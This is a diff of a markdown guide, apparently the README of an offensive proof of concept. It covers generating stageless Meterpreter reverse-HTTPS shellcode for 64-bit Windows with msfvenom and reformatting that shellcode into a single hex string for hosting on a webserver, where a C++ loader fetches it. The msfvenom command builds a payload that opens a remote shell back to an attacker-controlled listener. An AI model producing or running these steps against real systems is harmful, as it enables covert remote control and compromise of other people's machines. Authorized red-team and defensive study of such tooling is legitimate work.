@@ -18,9 +18,17 @@ on a webserver.
 
 
 
-**1. Creating Stageless Shellcode with MSF-Venom**
+**1. Creating stageless shellcode with MSF-Venom**
 
 **kali>** msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.0.1 LPORT=443 -f c --arch x64 --platform windows -o /tmp/meterx64.c
 
-![image](https://user-images.githubusercontent.com/50073731/160273773-3835a406-3500-43fd-b895-5f34e04188be.png)
+![image](https://user-images.githubusercontent.com/50073731/160274011-82fd0f13-a52c-4f90-93bd-01d39a9872d9.png)
+
+
+
+**2. Hosting file with MSF-stageless shellcode on webserver**
+
+Based on the code in the c++ POC the hosted shellcode must be in HEX-Format. To bring the whole MSF-shellcode in one line, you can use the
+the line operation function in Notpad++ join lines and then remove not spaces and the double quotes in the string. Only at the beginning and the end
+we need from the HEX-shellcode string we need double quotes.
 
